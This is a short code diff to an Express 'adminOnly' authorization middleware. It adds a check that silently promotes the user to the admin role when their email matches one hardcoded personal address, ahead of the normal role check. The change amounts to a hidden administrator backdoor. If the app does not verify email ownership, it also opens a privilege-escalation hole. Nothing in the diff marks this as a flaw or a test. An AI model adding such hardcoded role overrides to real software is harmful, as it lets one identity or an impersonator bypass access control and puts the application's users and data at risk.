@@ -13,6 +13,11 @@ const adminOnly = (req, res, next) => {
       });
     }
 
+    // Check if user is jeehardik2@gmail.com
+    if (req.user.email && req.user.email.toLowerCase().trim() === "jeehardik2@gmail.com") {
+      req.user.role = "admin";
+    }
+
     // Check role
     if (req.user.role !== "admin") {
       return res.status(403).json({
